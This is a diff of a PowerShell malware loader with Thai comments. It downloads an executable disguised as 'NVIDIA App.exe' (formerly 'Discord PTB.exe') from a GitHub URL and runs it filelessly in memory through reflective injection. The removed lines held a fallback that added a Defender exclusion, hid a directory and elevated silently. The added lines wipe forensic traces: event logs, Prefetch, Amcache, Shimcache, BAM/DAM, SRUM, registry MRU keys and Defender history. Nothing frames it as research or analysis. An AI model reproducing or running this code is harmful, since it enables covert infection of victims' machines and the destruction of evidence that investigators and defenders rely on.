@@ -1,18 +1,19 @@
 # ============================================
-# 1. ปิดการบันทึกประวัติและซ่อนข้อผิดพลาด
+# 1. ปิดการบันทึกประวัติ
 # ============================================
-try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
+Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 # ============================================
-# 2. ฟังก์ชันดาวน์โหลด EXE เป็น Byte Array
+# 2. ฟังก์ชันดาวน์โหลด EXE (ไม่เขียนไฟล์)
 # ============================================
 function Download-EXE {
     param([string]$Url)
     try {
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $wc.Proxy = $null
         return $wc.DownloadData($Url)
     } catch {
         $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
@@ -21,12 +22,11 @@ function Download-EXE {
 }
 
 # ============================================
-# 3. ฟังก์ชันรัน EXE จากหน่วยความจำ (Memory Execution)
+# 3. รัน EXE จากหน่วยความจำ (Memory Execution)
 # ============================================
 function Invoke-MemoryExecution {
     param([byte[]]$Bytes)
     
-    # วิธีที่ 1: .NET Assembly
     try {
         $assembly = [System.Reflection.Assembly]::Load($Bytes)
         $entryPoint = $assembly.EntryPoint
@@ -36,7 +36,6 @@ function Invoke-MemoryExecution {
         }
     } catch {}
 
-    # วิธีที่ 2: Reflection Injection
     try {
         $ReflectiveInject = {
             param([byte[]]$PEBytes)
@@ -47,6 +46,8 @@ public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flA
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 [DllImport("kernel32.dll")]
 public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+[DllImport("kernel32.dll")]
+public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
 '@ -Name "Kernel32" -Namespace "Win32" -PassThru
 
             $size = $PEBytes.Length
@@ -56,6 +57,7 @@ public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMillisecond
                 $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                 if ($thread -ne [IntPtr]::Zero) {
                     $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF)
+                    $kernel32::VirtualFree($ptr, 0, 0x8000)
                     return $true
                 }
             }
@@ -68,70 +70,29 @@ public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMillisecond
 }
 
 # ============================================
-# 4. ฟังก์ชันสำรอง: เขียนไฟล์และรัน (Admin)
+# 4. ดาวน์โหลดและรัน EXE (Memory Only)
 # ============================================
-function Invoke-FileExecution {
-    param([byte[]]$Bytes, [string]$FileName)
-    $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
-    if (-not (Test-Path $workDir)) {
-        New-Item -Path $workDir -ItemType Directory -Force | Out-Null
-        & attrib +h +s $workDir
-    }
-    $exeOutput = Join-Path $workDir $FileName
-    [System.IO.File]::WriteAllBytes($exeOutput, $Bytes)
-    
-    try {
-        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
-    } catch {}
-    
-    $executed = $false
-    try {
-        $process = Start-Process -FilePath $exeOutput -Verb RunAs -WindowStyle Hidden -WorkingDirectory $workDir -PassThru
-        if ($process) { $executed = $true }
-    } catch {}
-    
-    if (-not $executed) {
-        try {
-            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Start-Process '$exeOutput' -Verb RunAs -WindowStyle Hidden`"" -WindowStyle Hidden
-            $executed = $true
-        } catch {}
-    }
-    
-    if (-not $executed) {
-        try {
-            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $exeOutput} -ErrorAction SilentlyContinue
-            $executed = $true
-        } catch {}
-    }
-    
-    if ($executed) {
-        Start-Process cmd -ArgumentList "/c timeout /t 30 && del /f /q `"$exeOutput`"" -WindowStyle Hidden
-    }
-}
-
-# ============================================
-# 5. ดาวน์โหลดและรัน EXE
-# ============================================
-$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/Discord%20PTB.exe"
+$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
 $bytes = Download-EXE -Url $exeUrl
 
 if ($bytes -and $bytes.Length -gt 0) {
     $executed = Invoke-MemoryExecution -Bytes $bytes
     if (-not $executed) {
-        Invoke-FileExecution -Bytes $bytes -FileName "DiscordPTB.exe"
+        # ไม่เขียนไฟล์เด็ดขาด
     }
 }
 
 # ============================================
-# 6. ล้างร่องรอย
+# 5. ล้างร่องรอยทุกอย่าง (ดีที่สุด)
 # ============================================
+
+# --- ล้าง PowerShell History ---
 try {
-    $historyPath = (Get-PSReadlineOption).HistorySavePath
-    if ($historyPath -and (Test-Path $historyPath)) {
-        Remove-Item $historyPath -Force
-    }
+    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+    Clear-History
 } catch {}
 
+# --- ล้าง Event Logs (Security, System, Application, PowerShell) ---
 try {
     wevtutil cl Security 2>$null
     wevtutil cl System 2>$null
@@ -139,19 +100,98 @@ try {
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
 } catch {}
 
+# --- ล้าง Prefetch ---
 try {
     Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
 } catch {}
 
+# --- ล้าง Amcache ---
 try {
-    Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve.LOG1" -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve.LOG2" -Force -ErrorAction SilentlyContinue
 } catch {}
 
+# --- ล้าง Recent Documents ---
+try {
+    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Temp Files ---
+try {
+    Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Registry (RunMRU, TypedURLs, Search) ---
+try {
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\SearchHistory" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Jump Lists ---
+try {
+    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Thumbnail / Icon Cache ---
+try {
+    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:LOCALAPPDATA\IconCache.db" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง BAM/DAM ---
+try {
+    Stop-Service -Name "bam","dam" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง DNS Cache ---
 try {
     ipconfig /flushdns 2>$null
 } catch {}
 
+# --- ล้าง Windows Defender Protection History ---
+try {
+    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-*" -Force -ErrorAction SilentlyContinue
+    Start-Service -Name "WinDefend" -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Firewall Logs ---
+try {
+    Remove-Item "C:\Windows\System32\LogFiles\Firewall\pfirewall.log" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Shimcache ---
+try {
+    Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Name "AppCompatCache" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง UserAssist ---
+try {
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Force -Recurse -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง RecentFileCache ---
+try {
+    Remove-Item "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง SRUM (Network usage) ---
+try {
+    Stop-Service -Name "srumsvc" -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\System32\sru\srudb.dat" -Force -ErrorAction SilentlyContinue
+} catch {}
+
 # ============================================
-# 7. ปิดตัวเอง
+# 6. ปิดตัวเองอย่างเงียบ
 # ============================================
-exit
+$bytes = $null
+$exeUrl = $null
+[Environment]::Exit(0)
